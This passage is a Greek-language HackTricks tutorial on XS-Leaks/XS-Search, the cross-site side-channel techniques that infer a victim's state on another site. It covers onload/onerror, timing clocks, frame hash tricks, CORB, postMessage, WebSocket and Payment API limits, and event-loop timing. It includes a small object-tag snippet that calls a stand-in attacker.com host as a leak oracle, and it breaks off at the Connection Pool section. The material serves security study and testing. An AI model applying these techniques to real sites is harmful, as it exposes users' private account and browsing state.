# XS-Search/XS-Leaks

{{#include ../banners/hacktricks-training.md}}

## Basic Information

XS-Search είναι μια μέθοδος που χρησιμοποιείται για **την εξαγωγή πληροφοριών από διαφορετικές προελεύσεις** εκμεταλλευόμενη **ευπάθειες πλευρικών καναλιών**.

Τα κύρια στοιχεία που εμπλέκονται σε αυτή την επίθεση περιλαμβάνουν:

- **Ευάλωτο Web**: Η στοχευμένη ιστοσελίδα από την οποία προορίζεται να εξαχθούν πληροφορίες.
- **Web του επιτιθέμενου**: Η κακόβουλη ιστοσελίδα που δημιουργείται από τον επιτιθέμενο, την οποία επισκέπτεται το θύμα, φιλοξενώντας την εκμετάλλευση.
- **Μέθοδος Συμπερίληψης**: Η τεχνική που χρησιμοποιείται για να ενσωματώσει το Ευάλωτο Web στο Web του επιτιθέμενου (π.χ., window.open, iframe, fetch, HTML tag με href, κ.λπ.).
- **Τεχνική Διαρροής**: Τεχνικές που χρησιμοποιούνται για να διακρίνουν διαφορές στην κατάσταση του Ευάλωτου Web με βάση τις πληροφορίες που συλλέγονται μέσω της μεθόδου συμπερίληψης.
- **Καταστάσεις**: Οι δύο πιθανές συνθήκες του Ευάλωτου Web, τις οποίες ο επιτιθέμενος στοχεύει να διακρίνει.
- **Ανιχνεύσιμες Διαφορές**: Παρατηρήσιμες παραλλαγές στις οποίες ο επιτιθέμενος βασίζεται για να συμπεράνει την κατάσταση του Ευάλωτου Web.

### Detectable Differences

Διάφορες πτυχές μπορούν να αναλυθούν για να διαφοροποιήσουν τις καταστάσεις του Ευάλωτου Web:

- **Κωδικός Κατάστασης**: Διαχωρισμός μεταξύ **διαφορετικών κωδικών κατάστασης HTTP** από διαφορετικές προελεύσεις, όπως σφάλματα διακομιστή, σφάλματα πελάτη ή σφάλματα αυθεντικοποίησης.
- **Χρήση API**: Αναγνώριση **χρήσης Web APIs** σε σελίδες, αποκαλύπτοντας αν μια σελίδα από διαφορετική προέλευση χρησιμοποιεί μια συγκεκριμένη JavaScript Web API.
- **Ανακατευθύνσεις**: Ανίχνευση πλοηγήσεων σε διαφορετικές σελίδες, όχι μόνο HTTP ανακατευθύνσεις αλλά και αυτές που ενεργοποιούνται από JavaScript ή HTML.
- **Περιεχόμενο Σελίδας**: Παρατήρηση **παραλλαγών στο σώμα της απόκρισης HTTP** ή σε υπο-πόρους της σελίδας, όπως ο **αριθμός των ενσωματωμένων πλαισίων** ή οι διαφορές μεγέθους στις εικόνες.
- **HTTP Header**: Σημείωση της παρουσίας ή πιθανώς της τιμής ενός **συγκεκριμένου HTTP response header**, συμπεριλαμβανομένων των headers όπως X-Frame-Options, Content-Disposition και Cross-Origin-Resource-Policy.
- **Χρόνος**: Παρατήρηση συνεπών διαφορών χρόνου μεταξύ των δύο καταστάσεων.

### Inclusion Methods

- **HTML Elements**: Το HTML προσφέρει διάφορα στοιχεία για **συμπερίληψη πόρων από διαφορετικές προελεύσεις**, όπως στυλ, εικόνες ή σενάρια, αναγκάζοντας τον περιηγητή να ζητήσει έναν μη-HTML πόρο. Μια συλλογή πιθανών HTML στοιχείων για αυτό το σκοπό μπορεί να βρεθεί στο [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
- **Frames**: Στοιχεία όπως **iframe**, **object** και **embed** μπορούν να ενσωματώσουν HTML πόρους απευθείας στη σελίδα του επιτιθέμενου. Εάν η σελίδα **λείπει προστασία πλαισίωσης**, το JavaScript μπορεί να έχει πρόσβαση στο αντικείμενο παραθύρου του πλαισιωμένου πόρου μέσω της ιδιότητας contentWindow.
- **Pop-ups**: Η μέθοδος **`window.open`** ανοίγει έναν πόρο σε μια νέα καρτέλα ή παράθυρο, παρέχοντας ένα **handle παραθύρου** για το JavaScript να αλληλεπιδρά με μεθόδους και ιδιότητες σύμφωνα με το SOP. Οι pop-ups, που χρησιμοποιούνται συχνά σε single sign-on, παρακάμπτουν τους περιορισμούς πλαισίωσης και cookie ενός στοχευμένου πόρου. Ωστόσο, οι σύγχρονοι περιηγητές περιορίζουν τη δημιουργία pop-up σε ορισμένες ενέργειες χρηστών.
- **JavaScript Requests**: Το JavaScript επιτρέπει άμεσες αιτήσεις σε στοχευμένους πόρους χρησιμοποιώντας **XMLHttpRequests** ή το **Fetch API**. Αυτές οι μέθοδοι προσφέρουν ακριβή έλεγχο πάνω στην αίτηση, όπως η επιλογή να ακολουθήσουν HTTP ανακατευθύνσεις.

### Leak Techniques

- **Event Handler**: Μια κλασική τεχνική διαρροής στα XS-Leaks, όπου οι χειριστές γεγονότων όπως **onload** και **onerror** παρέχουν πληροφορίες σχετικά με την επιτυχία ή αποτυχία φόρτωσης πόρων.
- **Σφάλματα**: Οι εξαιρέσεις JavaScript ή οι ειδικές σελίδες σφαλμάτων μπορούν να παρέχουν πληροφορίες διαρροής είτε άμεσα από το μήνυμα σφάλματος είτε διαχωρίζοντας την παρουσία και την απουσία του.
- **Παγκόσμιοι Περιορισμοί**: Φυσικοί περιορισμοί ενός περιηγητή, όπως η χωρητικότητα μνήμης ή άλλοι επιβεβλημένοι περιορισμοί του περιηγητή, μπορούν να σήμαναν πότε έχει φτάσει ένα όριο, λειτουργώντας ως τεχνική διαρροής.
- **Παγκόσμια Κατάσταση**: Ανιχνεύσιμες αλληλεπιδράσεις με τις **παγκόσμιες καταστάσεις** των περιηγητών (π.χ., η διεπαφή Ιστορίας) μπορούν να εκμεταλλευτούν. Για παράδειγμα, ο **αριθμός των καταχωρίσεων** στην ιστορία ενός περιηγητή μπορεί να προσφέρει ενδείξεις σχετικά με σελίδες από διαφορετικές προελεύσεις.
- **Performance API**: Αυτό το API παρέχει **λεπτομέρειες απόδοσης της τρέχουσας σελίδας**, συμπεριλαμβανομένου του χρόνου δικτύου για το έγγραφο και τους φορτωμένους πόρους, επιτρέποντας συμπεράσματα σχετικά με τους ζητούμενους πόρους.
- **Αναγνώσιμες Ιδιότητες**: Ορισμένες HTML ιδιότητες είναι **αναγνώσιμες από διαφορετικές προελεύσεις** και μπορούν να χρησιμοποιηθούν ως τεχνική διαρροής. Για παράδειγμα, η ιδιότητα `window.frame.length` επιτρέπει στο JavaScript να μετρά τα πλαίσια που περιλαμβάνονται σε μια ιστοσελίδα από διαφορετική προέλευση.

## XSinator Tool & Paper

XSinator είναι ένα αυτόματο εργαλείο για **έλεγχο περιηγητών έναντι αρκετών γνωστών XS-Leaks** που εξηγούνται στην εργασία του: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Μπορείτε να **πρόσβαση στο εργαλείο στο** [**https://xsinator.com/**](https://xsinator.com/)

> [!WARNING]
> **Εξαιρούμενες XS-Leaks**: Αναγκαστήκαμε να εξαιρέσουμε XS-Leaks που βασίζονται σε **service workers** καθώς θα παρεμβαίνουν σε άλλες διαρροές στο XSinator. Επιπλέον, επιλέξαμε να **εξαιρέσουμε XS-Leaks που βασίζονται σε κακή διαμόρφωση και σφάλματα σε μια συγκεκριμένη διαδικτυακή εφαρμογή**. Για παράδειγμα, κακές διαμορφώσεις Cross-Origin Resource Sharing (CORS), διαρροές postMessage ή Cross-Site Scripting. Επιπλέον, εξαιρέσαμε τις XS-Leaks που βασίζονται σε χρόνο, καθώς συχνά υποφέρουν από αργές, θορυβώδεις και ανακριβείς μετρήσεις.

## **Timing Based techniques**

Ορισμένες από τις παρακάτω τεχνικές θα χρησιμοποιήσουν το χρόνο ως μέρος της διαδικασίας για να ανιχνεύσουν διαφορές στις πιθανές καταστάσεις των ιστοσελίδων. Υπάρχουν διάφοροι τρόποι μέτρησης του χρόνου σε έναν περιηγητή.

**Ρολόγια**: Το [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API επιτρέπει στους προγραμματιστές να αποκτούν μετρήσεις χρόνου υψηλής ανάλυσης.\
Υπάρχει ένας σημαντικός αριθμός APIs που οι επιτιθέμενοι μπορούν να καταχραστούν για να δημιουργήσουν έμμεσες ρολόγια: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animations, και άλλα.\
Για περισσότερες πληροφορίες: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Event Handler Techniques

### Onload/Onerror

- **Μέθοδοι Συμπερίληψης**: Frames, HTML Elements
- **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
- **Περισσότερες πληροφορίες**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **Σύνοψη**: αν προσπαθείτε να φορτώσετε έναν πόρο, τα γεγονότα onerror/onload ενεργοποιούνται με την επιτυχία/αποτυχία φόρτωσης του πόρου, είναι δυνατόν να καταλάβετε τον κωδικό κατάστασης.
- **Παράδειγμα κώδικα**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)

{{#ref}}
xs-search/cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

Το παράδειγμα κώδικα προσπαθεί να **φορτώσει αντικείμενα scripts από JS**, αλλά **άλλες ετικέτες** όπως αντικείμενα, στυλ, εικόνες, ήχοι θα μπορούσαν επίσης να χρησιμοποιηθούν. Επιπλέον, είναι επίσης δυνατό να εισαχθεί η **ετικέτα απευθείας** και να δηλωθούν τα γεγονότα `onload` και `onerror` μέσα στην ετικέτα (αντί να την εισάγουμε από το JS).

Υπάρχει επίσης μια έκδοση αυτής της επίθεσης χωρίς σενάριο:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Σε αυτή την περίπτωση, αν το `example.com/404` δεν βρεθεί, θα φορτωθεί το `attacker.com/?error`.

### Χρόνος Onload

- **Μέθοδοι Συμπερίληψης**: HTML Στοιχεία
- **Ανιχνεύσιμη Διαφορά**: Χρόνος (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Σύνοψη:** Η [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο χρειάζεται για να εκτελέσει ένα αίτημα. Ωστόσο, άλλες ρολόγια θα μπορούσαν να χρησιμοποιηθούν, όπως το [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) που μπορεί να εντοπίσει εργασίες που εκτελούνται για περισσότερα από 50ms.
- **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) άλλο παράδειγμα σε:

{{#ref}}
xs-search/performance.now-example.md
{{#endref}}

#### Χρόνος Onload + Υποχρεωτική Βαριά Εργασία

Αυτή η τεχνική είναι ακριβώς όπως η προηγούμενη, αλλά ο **επιτιθέμενος** θα **αναγκάσει** επίσης κάποια ενέργεια να διαρκέσει μια **σχετική ποσότητα χρόνου** όταν η **απάντηση είναι θετική ή αρνητική** και θα μετρήσει αυτόν τον χρόνο.

{{#ref}}
xs-search/performance.now-+-force-heavy-task.md
{{#endref}}

### Χρόνος unload/beforeunload

- **Μέθοδοι Συμπερίληψης**: Πλαίσια
- **Ανιχνεύσιμη Διαφορά**: Χρόνος (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Σύνοψη:** Το [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο χρειάζεται για να εκτελέσει ένα αίτημα. Άλλα ρολόγια θα μπορούσαν να χρησιμοποιηθούν.
- **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Ο χρόνος που απαιτείται για να ανακτηθεί μια πηγή μπορεί να μετρηθεί χρησιμοποιώντας τα γεγονότα [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) και [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event). Το γεγονός **`beforeunload`** ενεργοποιείται όταν ο περιηγητής πρόκειται να πλοηγηθεί σε μια νέα σελίδα, ενώ το γεγονός **`unload`** συμβαίνει όταν η πλοήγηση πραγματοποιείται πραγματικά. Η χρονική διαφορά μεταξύ αυτών των δύο γεγονότων μπορεί να υπολογιστεί για να προσδιορίσει τη **διάρκεια που πέρασε ο περιηγητής ανακτώντας την πηγή**.

### Χρόνος Sandboxed Frame + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Μέθοδοι Συμπερίληψης**: Πλαίσια
- **Ανιχνεύσιμη Διαφορά**: Χρόνος (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Σύνοψη:** Η [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο χρειάζεται για να εκτελέσει ένα αίτημα. Άλλα ρολόγια θα μπορούσαν να χρησιμοποιηθούν.
- **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Έχει παρατηρηθεί ότι στην απουσία των [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), ο χρόνος που απαιτείται για να φορτωθεί μια σελίδα και οι υποπηγές της μέσω του δικτύου μπορεί να μετρηθεί από έναν επιτιθέμενο. Αυτή η μέτρηση είναι συνήθως δυνατή επειδή ο χειριστής `onload` ενός iframe ενεργοποιείται μόνο μετά την ολοκλήρωση της φόρτωσης πόρων και της εκτέλεσης JavaScript. Για να παρακαμφθεί η μεταβλητότητα που εισάγεται από την εκτέλεση σεναρίων, ένας επιτιθέμενος μπορεί να χρησιμοποιήσει το χαρακτηριστικό [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) μέσα στο `<iframe>`. Η συμπερίληψη αυτού του χαρακτηριστικού περιορίζει πολλές λειτουργίες, ιδίως την εκτέλεση JavaScript, διευκολύνοντας έτσι μια μέτρηση που επηρεάζεται κυρίως από την απόδοση του δικτύου.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **Inclusion Methods**: Frames
- **Detectable Difference**: Περιεχόμενο Σελίδας
- **More info**:
- **Summary**: Αν μπορείτε να προκαλέσετε σφάλμα στη σελίδα όταν προσπελάσετε το σωστό περιεχόμενο και να την φορτώσετε σωστά όταν προσπελάσετε οποιοδήποτε περιεχόμενο, τότε μπορείτε να δημιουργήσετε έναν βρόχο για να εξάγετε όλες τις πληροφορίες χωρίς να μετρήσετε τον χρόνο.
- **Code Example**:

Υποθέστε ότι μπορείτε να **εισάγετε** τη **σελίδα** που έχει το **μυστικό** περιεχόμενο **μέσα σε ένα Iframe**.

Μπορείτε να **κάνετε το θύμα να αναζητήσει** το αρχείο που περιέχει "_**flag**_" χρησιμοποιώντας ένα **Iframe** (εκμεταλλευόμενοι ένα CSRF για παράδειγμα). Μέσα στο Iframe γνωρίζετε ότι το _**onload event**_ θα εκτελείται **πάντα τουλάχιστον μία φορά**. Στη συνέχεια, μπορείτε να **αλλάξετε** τη **διεύθυνση URL** του **iframe** αλλάζοντας μόνο το **περιεχόμενο** του **hash** μέσα στη διεύθυνση URL.

Για παράδειγμα:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Αν η πρώτη διεύθυνση URL **φορτώθηκε επιτυχώς**, τότε, όταν **αλλάξετε** το **hash** μέρος της διεύθυνσης URL, το **onload** event **δεν θα ενεργοποιηθεί** ξανά. Αλλά **αν** η σελίδα είχε κάποιο είδος **σφάλματος** κατά τη **φόρτωση**, τότε, το **onload** event θα **ενεργοποιηθεί ξανά**.

Στη συνέχεια, μπορείτε να **διακρίνετε** μεταξύ μιας **σωστά** φορτωμένης σελίδας ή μιας σελίδας που έχει ένα **σφάλμα** όταν προσπελάζεται.

### Javascript Execution

- **Inclusion Methods**: Frames
- **Detectable Difference**: Περιεχόμενο Σελίδας
- **More info**:
- **Summary:** Αν η **σελίδα** **επιστρέφει** το **ευαίσθητο** περιεχόμενο, **ή** ένα **περιεχόμενο** που μπορεί να **ελεγχθεί** από τον χρήστη. Ο χρήστης θα μπορούσε να ορίσει **έγκυρο JS κώδικα στην αρνητική περίπτωση**, να **φορτώνει** κάθε προσπάθεια μέσα σε **`<script>`** ετικέτες, έτσι σε **αρνητικές** περιπτώσεις ο **κώδικας** των επιτιθεμένων **εκτελείται**, και σε **θετικές** περιπτώσεις **τίποτα** δεν θα εκτελείται.
- **Code Example:**

{{#ref}}
xs-search/javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Κωδικός Κατάστασης & Επικεφαλίδες
- **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Summary**: **Cross-Origin Read Blocking (CORB)** είναι ένα μέτρο ασφαλείας που αποτρέπει τις ιστοσελίδες από το να φορτώνουν ορισμένους ευαίσθητους πόρους από άλλες προελεύσεις για να προστατεύσουν από επιθέσεις όπως το **Spectre**. Ωστόσο, οι επιτιθέμενοι μπορούν να εκμεταλλευτούν τη συμπεριφορά προστασίας του. Όταν μια απάντηση που υπόκειται σε **CORB** επιστρέφει έναν _**CORB protected**_ `Content-Type` με `nosniff` και έναν `2xx` κωδικό κατάστασης, το **CORB** αφαιρεί το σώμα και τις επικεφαλίδες της απάντησης. Οι επιτιθέμενοι που παρατηρούν αυτό μπορούν να συμπεράνουν τη συνδυασμένη **κατάσταση κωδικού** (που υποδεικνύει επιτυχία ή σφάλμα) και το `Content-Type` (που δηλώνει αν είναι προστατευμένο από **CORB**), οδηγώντας σε πιθανή διαρροή πληροφοριών.
- **Code Example**:

Ελέγξτε τον σύνδεσμο περισσότερων πληροφοριών για περισσότερες πληροφορίες σχετικά με την επίθεση.

### onblur

- **Inclusion Methods**: Frames
- **Detectable Difference**: Περιεχόμενο Σελίδας
- **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Summary**: Διαρροή ευαίσθητων δεδομένων από το id ή το όνομα χαρακτηριστικό.
- **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Είναι δυνατόν να **φορτώσετε μια σελίδα** μέσα σε ένα **iframe** και να χρησιμοποιήσετε το **`#id_value`** για να κάνετε τη σελίδα **να εστιάσει στο στοιχείο** του iframe με το υποδεικνυόμενο αν, τότε αν ένα σήμα **`onblur`** ενεργοποιηθεί, το στοιχείο ID υπάρχει.\
Μπορείτε να εκτελέσετε την ίδια επίθεση με **`portal`** ετικέτες.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Χρήση API
- **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Summary**: Συγκέντρωση ευαίσθητων πληροφοριών από ένα postMessage ή χρήση της παρουσίας των postMessages ως οράκλας για να γνωρίζετε την κατάσταση του χρήστη στη σελίδα
- **Code Example**: `Οποιοσδήποτε κώδικας ακούει για όλα τα postMessages.`

Οι εφαρμογές χρησιμοποιούν συχνά [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) για να επικοινωνούν μεταξύ διαφορετικών προελεύσεων. Ωστόσο, αυτή η μέθοδος μπορεί ακούσια να εκθέσει **ευαίσθητες πληροφορίες** αν η παράμετρος `targetOrigin` δεν καθοριστεί σωστά, επιτρέποντας σε οποιοδήποτε παράθυρο να λάβει τα μηνύματα. Επιπλέον, η απλή πράξη λήψης ενός μηνύματος μπορεί να λειτουργήσει ως **οράκλας**; για παράδειγμα, ορισμένα μηνύματα μπορεί να αποστέλλονται μόνο σε χρήστες που είναι συνδεδεμένοι. Επομένως, η παρουσία ή η απουσία αυτών των μηνυμάτων μπορεί να αποκαλύψει πληροφορίες σχετικά με την κατάσταση ή την ταυτότητα του χρήστη, όπως αν είναι πιστοποιημένος ή όχι.

## Global Limits Techniques

### WebSocket API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Χρήση API
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: Η εξάντληση του ορίου σύνδεσης WebSocket διαρρέει τον αριθμό των συνδέσεων WebSocket μιας διασυνοριακής σελίδας.
- **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

Είναι δυνατόν να προσδιορίσετε αν, και πόσες, **συνδέσεις WebSocket χρησιμοποιεί μια στοχευμένη σελίδα**. Αυτό επιτρέπει σε έναν επιτιθέμενο να ανιχνεύσει τις καταστάσεις εφαρμογής και να διαρρεύσει πληροφορίες που σχετίζονται με τον αριθμό των συνδέσεων WebSocket.

Αν μια **προέλευση** χρησιμοποιεί το **μέγιστο ποσό αντικειμένων σύνδεσης WebSocket**, ανεξάρτητα από την κατάσταση των συνδέσεών τους, η δημιουργία **νέων αντικειμένων θα έχει ως αποτέλεσμα εξαιρέσεις JavaScript**. Για να εκτελέσετε αυτήν την επίθεση, η ιστοσελίδα του επιτιθέμενου ανοίγει την στοχευμένη ιστοσελίδα σε ένα αναδυόμενο παράθυρο ή iframe και στη συνέχεια, αφού έχει φορτωθεί η στοχευμένη ιστοσελίδα, προσπαθεί να δημιουργήσει τον μέγιστο αριθμό δυνατών συνδέσεων WebSocket. Ο **αριθμός των εκτιθέμενων εξαιρέσεων** είναι ο **αριθμός των συνδέσεων WebSocket που χρησιμοποιούνται από την στοχευμένη ιστοσελίδα**.

### Payment API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Χρήση API
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: Ανίχνευση αιτήματος πληρωμής επειδή μόνο ένα μπορεί να είναι ενεργό τη φορά.
- **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Αυτή η διαρροή XS επιτρέπει σε έναν επιτιθέμενο να **ανιχνεύσει πότε μια διασυνοριακή σελίδα ξεκινά ένα αίτημα πληρωμής**.

Επειδή **μόνο ένα αίτημα πληρωμής μπορεί να είναι ενεργό** τη φορά, αν η στοχευμένη ιστοσελίδα χρησιμοποιεί το Payment Request API, οποιαδήποτε περαιτέρω προσπάθεια να χρησιμοποιήσει αυτό το API θα αποτύχει** και θα προκαλέσει μια **εξαίρεση JavaScript**. Ο επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό προσπαθώντας **περιοδικά να εμφανίσει το UI του Payment API**. Αν μια προσπάθεια προκαλέσει μια εξαίρεση, η στοχευμένη ιστοσελίδα το χρησιμοποιεί αυτή τη στιγμή. Ο επιτιθέμενος μπορεί να κρύψει αυτές τις περιοδικές προσπάθειες κλείνοντας αμέσως το UI μετά τη δημιουργία του.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Χρονισμός (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **Summary:** Μετρήστε τον χρόνο εκτέλεσης ενός ιστού εκμεταλλευόμενοι τον μονόνημα JS event loop.
- **Code Example**:

{{#ref}}
xs-search/event-loop-blocking-+-lazy-images.md
{{#endref}}

Η JavaScript λειτουργεί σε ένα [μονόνημα event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) μοντέλο ταυτόχρονης εκτέλεσης, υποδηλώνοντας ότι **μπορεί να εκτελεί μόνο μία εργασία τη φορά**. Αυτή η χαρακτηριστική μπορεί να εκμεταλλευτεί για να μετρήσει **πόσο χρόνο χρειάζεται ο κώδικας από μια διαφορετική προέλευση για να εκτελεστεί**. Ένας επιτιθέμενος μπορεί να μετρήσει τον χρόνο εκτέλεσης του δικού του κώδικα στο event loop αποστέλλοντας συνεχώς γεγονότα με σταθερές ιδιότητες. Αυτά τα γεγονότα θα επεξεργαστούν όταν η δεξαμενή γεγονότων είναι άδεια. Αν και άλλες προελεύσεις αποστέλλουν επίσης γεγονότα στην ίδια δεξαμενή, ένας **επιτιθέμενος μπορεί να συμπεράνει τον χρόνο που χρειάζεται για να εκτελούνται αυτά τα εξωτερικά γεγονότα παρατηρώντας καθυστερήσεις στην εκτέλεση των δικών του εργασιών**. Αυτή η μέθοδος παρακολούθησης του event loop για καθυστερήσεις μπορεί να αποκαλύψει τον χρόνο εκτέλεσης του κώδικα από διαφορετικές προελεύσεις, ενδεχομένως εκθέτοντας ευαίσθητες πληροφορίες.

> [!WARNING]
> Σε έναν χρονισμό εκτέλεσης είναι δυνατόν να **εξαλείψετε** **παράγοντες δικτύου** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν την φορτώσετε.

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Χρονισμός (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **Summary:** Μια μέθοδος για να μετρήσετε τον χρόνο εκτέλεσης μιας διαδικασίας ιστού περιλαμβάνει σκόπιμα το μπλοκάρισμα του event loop ενός νήματος και στη συνέχεια το χρονισμό **πόσο χρόνο χρειάζεται για να γίνει διαθέσιμο ξανά το event loop**. Εισάγοντας μια μπλοκαρισμένη λειτουργία (όπως μια μακρά υπολογιστική διαδικασία ή μια συγχρονισμένη κλήση API) στο event loop και παρακολουθώντας τον χρόνο που χρειάζεται για να αρχίσει η εκτέλεση του επόμενου κώδικα, μπορεί κανείς να συμπεράνει τη διάρκεια των εργασιών που εκτελούνταν στο event loop κατά τη διάρκεια της μπλοκαρισμένης περιόδου. Αυτή η τεχνική εκμεταλλεύεται τη μονόνημη φύση του event loop της JavaScript, όπου οι εργασίες εκτελούνται διαδοχικά, και μπορεί να παρέχει πληροφορίες σχετικά με την απόδοση ή τη συμπεριφορά άλλων λειτουργιών που μοιράζονται το ίδιο νήμα.
- **Code Example**:

Ένα σημαντικό πλεονέκτημα της τεχνικής μέτρησης του χρόνου εκτέλεσης κλειδώνοντας το event loop είναι η δυνατότητά της να παρακάμψει **Site Isolation**. **Site Isolation** είναι μια λειτουργία ασφαλείας που χωρίζει διαφορετικές ιστοσελίδες σε ξεχωριστές διαδικασίες, με στόχο να αποτρέψει κακόβουλες ιστοσελίδες από το να έχουν άμεση πρόσβαση σε ευαίσθητα δεδομένα από άλλες ιστοσελίδες. Ωστόσο, επηρεάζοντας τον χρονισμό εκτέλεσης μιας άλλης προέλευσης μέσω του κοινόχρηστου event loop, ένας επιτιθέμενος μπορεί έμμεσα να εξάγει πληροφορίες σχετικά με τις δραστηριότητες αυτής της προέλευσης. Αυτή η μέθοδος δεν βασίζεται σε άμεση πρόσβαση στα δεδομένα της άλλης προέλευσης αλλά παρατηρεί την επίδραση των δραστηριοτήτων αυτής της προέλευσης στο κοινόχρηστο event loop, αποφεύγοντας έτσι τα προστατευτικά εμπόδια που έχουν καθοριστεί από το **Site Isolation**.

> [!WARNING]
> Σε έναν χρονισμό εκτέλεσης είναι δυνατόν να **εξαλείψετε** **παράγοντες δικτύου** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν την φορτώσετε.

### Connection Pool

- **Inclusion Methods**: JavaScript Requests
